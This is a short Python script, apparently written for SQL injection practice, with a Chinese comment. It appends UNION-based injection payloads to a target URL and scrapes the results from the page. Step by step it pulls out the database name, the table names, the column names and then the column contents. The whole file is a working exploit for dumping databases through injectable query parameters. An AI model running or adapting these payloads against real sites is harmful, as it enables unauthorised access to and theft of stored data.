import requests
from bs4 import BeautifulSoup
# 联合注入和报错注入用到的代码大同小异，这里不再赘述
def db(url):
    payload = "union select 1,2,database() -- -";
    response = requests.get(url + payload)
    soup = BeautifulSoup(response.text, 'html.parser')
    s=soup.find('font', {'size': '5', 'color': '#99FF00'}).text.strip()
    print(s)

def table(url):
    payload = "union select 1,2,group_concat(table_name)  from information_schema.tables where table_schema=database()-- - ";
    response = requests.get(url + payload)
    soup = BeautifulSoup(response.text, 'html.parser')
    s=soup.find('font', {'size': '5', 'color': '#99FF00'}).text.strip()
    print(s)

def colum(url,table_name):
    payload = "union select 1,2,group_concat(column_name)  from information_schema.columns where table_name='{0}' and table_schema=database()-- - ".format(table_name);
    # print(f'url={url}{payload}')
    response = requests.get(url + payload)
    soup = BeautifulSoup(response.text, 'html.parser')
    s=soup.find('font', {'size': '5', 'color': '#99FF00'}).text.strip()
    print(s)

def xx(url,database,table_name,column):
    payload = "union select 1,2,group_concat({0}) from {1}.{2}-- - ".format(column,database,table_name);
    response = requests.get(url + payload)
    soup = BeautifulSoup(response.text, 'html.parser')
    s=soup.find('font', {'size': '5', 'color': '#99FF00'}).text.strip()
    print(s)